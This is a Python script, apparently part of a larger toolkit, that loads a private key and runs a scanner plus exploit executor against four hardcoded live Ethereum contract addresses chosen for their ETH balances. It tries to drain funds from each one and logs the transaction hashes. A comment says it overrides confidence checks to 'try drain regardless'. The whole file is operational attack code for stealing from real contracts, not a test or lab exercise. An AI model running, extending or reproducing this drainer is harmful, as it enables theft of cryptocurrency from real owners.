"""Drain CRITICAL Ethereum findings — runs scanner with executor enabled."""
import tomllib
import logging
from decimal import Decimal
from src.rpc import RpcClient
from src.types import TokenInfo, PoolInfo, Chain
from src.scanners.evm_scanner import EvmScanner
from src.data import DataCollector
from src.explorer import ExplorerClient
from src.verifiers.runner import VerifierRunner
from src.verifiers.honeypot import HoneypotVerifier
from src.verifiers.exploit_simulator import SimulatedExploitVerifier
from src.verifiers.multi_step import MultiStepVerifier
from src.exploit_executor import ExploitExecutor
from src.signer import load_evm_private_key
from src.scanners.base import CheckContext

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s")
logger = logging.getLogger("drain-eth")

# Profitable CRITICAL hits from scan_rich_eth.py (>0.01 ETH)
TARGETS = [
    ("0xaa390a37006e22b5775a34f2147f81ebd6a63641", 3.5646),
    ("0x2eea44e40930b1984f42078e836c659a12301e40", 2.6767),
    ("0xe0e0e08a6a4b9dc7bd67bcb7aade5cf48157d444", 1.0213),
    ("0x1dff2177883032d9fc4907ed960511a8f27942c3", 0.0989),
]

def get_balance(rpc, addr):
    raw = rpc.call("eth_getBalance", [addr, "latest"])
    return int(str(raw), 16) / 1e18

def main():
    with open("config.toml", "rb") as f:
        config = tomllib.load(f)

    rpc = RpcClient(config["rpc"]["ethereum"], max_retries=5)
    chain = Chain.ETHEREUM

    signer = load_evm_private_key()
    bal = get_balance(rpc, signer.address)
    logger.info("Signer: %s | Balance: %.6f ETH", signer.address, bal)
    if bal < 0.0005:
        logger.error("Need >0.0005 ETH for gas!")
        return

    explorer = ExplorerClient()
    data = DataCollector(rpc=rpc, explorer=explorer)
    verifier_runner = VerifierRunner(verifiers=[
        HoneypotVerifier(), SimulatedExploitVerifier(), MultiStepVerifier(),
    ])
    executor = ExploitExecutor(signer=signer)
    scanner = EvmScanner(data_collector=data, rpc=rpc, verifier_runner=verifier_runner, executor=executor)

    for addr, known_bal in TARGETS:
        live_bal = get_balance(rpc, addr)
        logger.info("=" * 60)
        logger.info("Target: %s | %.6f ETH (known: %.4f)", addr, live_bal, known_bal)

        if live_bal < 0.0005:
            logger.info("  SKIP — already drained or empty")
            continue

        signer_bal = get_balance(rpc, signer.address)
        if signer_bal < 0.0003:
            logger.error("  Not enough gas! %.6f ETH left", signer_bal)
            break

        token = TokenInfo(address=addr, symbol=addr[:10], chain=chain)
        pool = PoolInfo(address="", dex="direct", liquidity_usd=Decimal("0"))

        try:
            report = scanner.scan(token, pool)
        except Exception as e:
            logger.error("  Scan failed: %s", e)
            continue

        criticals = [f for f in report.findings if f.severity.name == "CRITICAL"]
        logger.info("  CRITICAL findings: %d", len(criticals))

        drained = False
        for f in criticals:
            logger.info("  %s conf=%.2f can_execute=%s", f.check_name, f.confidence, executor.can_execute(f))

            # Override confidence check — try drain regardless if can_execute
            if executor.can_execute(f):
                ctx = CheckContext(token=token, pool=pool, data_collector=data, rpc=rpc)
                logger.info("  >>> DRAINING: %s", f.check_name)
                try:
                    result = executor.execute(ctx, f)
                    if result.get("success"):
                        logger.info("  >>> SUCCESS! TX: %s", result.get("tx_hash"))
                        drained = True
                        break
                    else:
                        logger.warning("  >>> FAILED: %s", result.get("error"))
                except Exception as e:
                    logger.error("  >>> EXCEPTION: %s", e)

        if drained:
            logger.info("  DRAINED — moving to next target")
            import time
            time.sleep(5)  # wait for tx to settle, nonce update
        else:
            logger.info("  No drainable finding found")

    final_bal = get_balance(rpc, signer.address)
    logger.info("=" * 60)
    logger.info("Signer: %.6f -> %.6f ETH", bal, final_bal)

if __name__ == "__main__":
    main()
